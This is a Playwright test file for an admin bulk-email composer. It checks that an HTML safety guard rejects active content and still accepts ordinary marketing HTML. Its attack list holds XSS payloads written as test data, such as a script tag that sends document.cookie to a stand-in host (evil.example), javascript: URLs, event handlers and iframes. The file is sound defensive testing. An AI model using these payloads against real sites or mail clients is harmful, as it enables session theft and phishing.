import { test, expect } from '@playwright/test';
import { Recorder } from './lib/recorder';
import { dangerousHtml, validateHtmlContent } from '../../api/_lib/htmlSafety';

/**
 * The bulk-email composer relays admin-authored HTML into customers' inboxes.
 * An admin account is not a licence to inject active content into other
 * people's mail clients, and a compromised admin session must not become a mass
 * phishing vector — so /api/email/bulk refuses HTML containing script tags,
 * javascript: URLs, inline event handlers, iframes, objects or embeds.
 *
 * This is pure logic, so it needs neither a browser nor the emulator, and — by
 * design — it does not send anything. Actually exercising a Brevo campaign send
 * is deliberately NOT automated: it would deliver real marketing email to real
 * contacts.
 */

const ATTACKS: { name: string; html: string }[] = [
  { name: 'script tag', html: '<p>Hi</p><script>fetch("//evil.example/"+document.cookie)</script>' },
  { name: 'uppercase script tag', html: '<SCRIPT>alert(1)</SCRIPT>' },
  { name: 'javascript: URL', html: '<a href="javascript:alert(1)">Shop the sale</a>' },
  { name: 'inline onclick handler', html: '<a href="#" onclick="steal()">Click</a>' },
  { name: 'onerror on a broken image', html: '<img src="x" onerror="alert(1)">' },
  { name: 'onload handler', html: '<body onload="alert(1)">' },
  { name: 'iframe', html: '<iframe src="//evil.example"></iframe>' },
  { name: 'object embed', html: '<object data="//evil.example"></object>' },
  { name: 'embed tag', html: '<embed src="//evil.example">' },
];

const LEGITIMATE: { name: string; html: string }[] = [
  { name: 'plain marketing copy', html: '<h1>New arrivals</h1><p>Hand-woven Banarasi, now in store.</p>' },
  { name: 'styled layout with a link', html: '<div style="font-family:Georgia"><a href="https://tresorcouture.in/#/shop">Shop now</a></div>' },
  { name: 'image and table', html: '<table><tr><td><img src="https://tresorcouture.in/a.jpg" alt="Silk"></td></tr></table>' },
];

test('Bulk email · HTML safety guard rejects active content', async () => {
  const rec = new Recorder({
    slug: 'bulk-email-html-safety',
    title: 'Bulk Email · HTML safety guard',
    area: 'Admin console · Bulk Email',
    purpose:
      'The bulk-email composer relays admin-authored HTML to customer inboxes. The server refuses HTML containing script tags, javascript: URLs, inline event handlers, iframes, objects or embeds — so a compromised admin session cannot turn the mailing list into a phishing vector — while leaving ordinary marketing HTML untouched.',
    reproduce: [
      'Sign in as an admin and open #/admin/bulk-email.',
      'Compose a campaign whose HTML body contains a <script> tag, or a link with a javascript: URL.',
      'Attempt to send: the request is rejected with html_content_forbidden and nothing is dispatched.',
      'Replace it with ordinary marketing HTML (headings, links, images, tables): the content is accepted.',
      'The same rule is unit-exercised by this test against nine attack payloads and three legitimate ones.',
    ],
  });

  try {
    for (const a of ATTACKS) {
      expect(dangerousHtml(a.html), `${a.name} must be rejected`).toBe(true);
      const v = validateHtmlContent(a.html);
      expect(v.ok).toBe(false);
      expect(v.error).toBe('html_content_forbidden');
      rec.note(`Blocked: ${a.name}`, 'Rejected as html_content_forbidden.');
    }

    for (const g of LEGITIMATE) {
      expect(dangerousHtml(g.html), `${g.name} must be allowed`).toBe(false);
      expect(validateHtmlContent(g.html).ok).toBe(true);
      rec.note(`Allowed: ${g.name}`, 'Ordinary marketing HTML passes untouched.');
    }

    // Empty content is a separate failure mode from dangerous content.
    const empty = validateHtmlContent('');
    expect(empty.ok).toBe(false);
    expect(empty.error).toBe('html_content_required');
    rec.note('Empty body rejected as html_content_required',
      'Distinguished from forbidden content so the admin sees the right message.');

    rec.finish('passed');
  } catch (err) {
    rec.finish('failed', err instanceof Error ? err.message : String(err));
    throw err;
  }
});
